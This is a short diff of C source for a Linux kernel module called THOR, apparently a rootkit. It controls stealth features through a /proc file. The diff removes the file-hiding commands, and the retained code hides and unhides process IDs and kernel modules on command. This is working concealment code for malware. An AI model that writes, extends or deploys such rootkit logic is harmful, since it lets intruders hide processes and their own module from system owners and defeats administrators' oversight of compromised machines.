@@ -54,9 +54,6 @@ static int procfile_read(struct seq_file *m, void *v)
     seq_printf(m, "   echo hp PID    > /proc/" THOR_PROCFILE " (hides process PID)\n");
     seq_printf(m, "   echo up PID    > /proc/" THOR_PROCFILE " (unhides process PID)\n");
     seq_printf(m, "   echo upa       > /proc/" THOR_PROCFILE " (unhide all PIDs)\n");
-    seq_printf(m, "   echo hf FILE   > /proc/" THOR_PROCFILE " (hide file FILE)\n");
-    seq_printf(m, "   echo uf FILE   > /proc/" THOR_PROCFILE " (unhide file FILE)\n");
-    seq_printf(m, "   echo ufa       > /proc/" THOR_PROCFILE " (unhide all files)\n");
     seq_printf(m, "   echo hm MODULE > /proc/" THOR_PROCFILE " (hide module)\n");
     seq_printf(m, "   echo um MODULE > /proc/" THOR_PROCFILE " (unhide module)\n");
     seq_printf(m, "   echo uma       > /proc/" THOR_PROCFILE " (unhide all modules)\n");
@@ -99,12 +96,6 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         } else {
             LOG_ERROR("kstrtoint failed to parse input: %s, error: %d", s_pid, r);
         }
-    } else if (strncmp(buffer, "hf ", MIN(3, count)) == 0) {
-        add_to_file_list(buffer + 3, count - 3);
-    } else if (strncmp(buffer, "ufa", MIN(3, count)) == 0) {
-        clear_file_list();
-    } else if (strncmp(buffer, "uf ", MIN(3, count)) == 0) {
-        remove_from_file_list(buffer + 3, count - 3);
     } else if (strncmp(buffer, "hm ", MIN(3, count)) == 0) {
         add_to_module_list(buffer + 3, count - 3);
     } else if (strncmp(buffer, "uma", MIN(3, count)) == 0) {
